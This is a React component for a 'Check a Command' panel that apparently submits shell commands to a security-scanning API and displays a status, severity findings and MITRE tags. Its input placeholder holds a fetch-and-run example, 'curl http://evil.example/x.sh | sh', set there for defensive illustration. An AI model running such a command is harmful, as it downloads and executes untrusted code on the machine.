import { useState } from "react";
import { checkCommand } from "../api.js";
import StatusBadge from "./StatusBadge.jsx";

export default function CommandChecker({ onChecked }) {
  const [command, setCommand] = useState("");
  const [result, setResult] = useState(null);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  const submit = async (e) => {
    e.preventDefault();
    if (!command.trim() || busy) return;
    setBusy(true);
    setError("");
    try {
      const entry = await checkCommand(command.trim());
      setResult(entry);
      setCommand("");
      onChecked?.();
    } catch (err) {
      setError(err.message);
    } finally {
      setBusy(false);
    }
  };

  return (
    <section className="panel">
      <div className="panel-header">
        <h2>Check a Command</h2>
      </div>
      <form className="check-form" onSubmit={submit}>
        <input
          className="input"
          type="text"
          placeholder="e.g. curl http://evil.example/x.sh | sh"
          value={command}
          onChange={(e) => setCommand(e.target.value)}
          disabled={busy}
        />
        <button className="btn btn-primary" type="submit" disabled={busy || !command.trim()}>
          {busy ? "Checking…" : "Check"}
        </button>
      </form>

      {error && <div className="banner banner-error">{error}</div>}

      {result && (
        <div className="result-box">
          <div className="result-row">
            <StatusBadge status={result.status} />
            <code className="result-command">{result.command}</code>
          </div>
          {result.note && <p className="result-note">{result.note}</p>}
          {result.findings?.length > 0 && (
            <ul className="findings">
              {result.findings.map((f, i) => (
                <li key={i}>
                  <span className={`sev sev-${f.severity.toLowerCase()}`}>{f.severity}</span>
                  <span>
                    {f.why} <span className="mitre">({f.mitre})</span>
                  </span>
                </li>
              ))}
            </ul>
          )}
        </div>
      )}
    </section>
  );
}
